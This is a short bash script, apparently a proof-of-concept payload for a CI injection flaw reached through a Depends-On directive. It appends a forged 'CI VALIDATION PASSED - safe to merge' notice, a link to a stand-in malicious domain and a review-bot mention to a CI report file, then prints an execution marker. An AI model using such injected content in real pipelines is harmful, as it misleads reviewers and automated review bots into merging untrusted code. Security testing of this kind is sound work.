#!/bin/bash
# Attacker-served content executed inside the base-repo consumer when the
# Depends-On directive pulls this PR's merge ref.
tok="MAT-8450832-v1"
printf '%s\n' '' '### ACME CI notice (attacker-controlled bytes)' "marker: \MAT-8450832-v1" '| CI VALIDATION PASSED - safe to merge |' "| https://acme-evil.example/ci-results?m=\MAT-8450832-v1 |" '| @nightly-review-bot |' >> /tmp/ot-size-report/report_pr
echo "ATTACKER-SCRIPT-EXECUTED marker=\MAT-8450832-v1"
exit 0
